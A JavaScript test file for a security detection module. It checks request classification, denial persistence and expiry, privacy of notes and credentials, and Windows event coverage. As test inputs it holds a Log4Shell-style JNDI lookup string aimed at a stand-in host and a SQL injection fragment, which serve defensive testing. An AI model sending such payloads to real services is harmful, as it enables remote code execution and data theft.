import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {createGatewayXdr} from '../on-client/student/netbird-xdr.mjs';
import {readWindowsXdr} from '../on-client/student/windows-xdr.mjs';
test('original runtime XDR classifies real HTTP shape, persists denial, and expires at 15 minutes; no note or credential inspection',async()=>{
 const directory=await mkdtemp(join(tmpdir(),'keshev-runtime-xdr-'));let time=Date.now(),audit=[];
 const options={directory,sourceAddress:'192.0.2.99',audit:(_actor,event)=>audit.push(event),clock:()=>time};let x=await createGatewayXdr(options);
 const input=path=>({method:'GET',path,headers:{},body:''}),actor={owner:'fixture'};
 try{
  assert.equal(await x.inspect(input('/api/my/notes'),actor),null);
  // Suspicious words inside credentials/notes are not an inspection input.
  assert.equal(await x.inspect({...input('/api/auth?path=token'),body:'password=union select'},actor),null);
  await x.response(input('/api/my/notes'),{status:200,data:[{body:'not inspected'}]},actor);
  const p='/api/my/notes?id='+encodeURIComponent('${jndi:ldap://example.invalid/only-text}');
  assert.equal((await x.inspect(input(p),actor)).code,'XDR_KNOWN_CVE');
  assert.equal(audit.at(-1).kind,'xdr');assert.equal(JSON.stringify(audit).includes('ldap'),false);
  x.close();x=await createGatewayXdr(options);assert.equal((await x.check()).code,'XDR_KNOWN_CVE');
  time+=899999;assert.ok(await x.check());time++;assert.equal(await x.check(),null);
  assert.equal((await x.status(actor)).modules.length,6);
 }finally{x.close();await rm(directory,{recursive:true,force:true});}
});
test('Windows native reader keeps absence and access failures explicit; no OS identity or raw event text escapes',async()=>{
 const r=await readWindowsXdr({os:'win32',execute:async()=>({stdout:JSON.stringify({coverage:{service:'measured',security:'unavailable'},events:[{kind:'service',eventId:7045,recordId:3,at:new Date().toISOString(),temporary:false,unsigned:false,privateAccount:'never returned'}]})})});
 assert.equal(r.coverage.status,'partial');assert.equal(r.coverage.securityEvents,'unavailable');assert.equal(r.events[0].kind,'persistence');assert.equal(JSON.stringify(r).includes('never returned'),false);
 assert.equal((await readWindowsXdr({os:'win32',execute:async()=>{throw Error('secret OS error');}})).coverage.status,'unavailable');
});
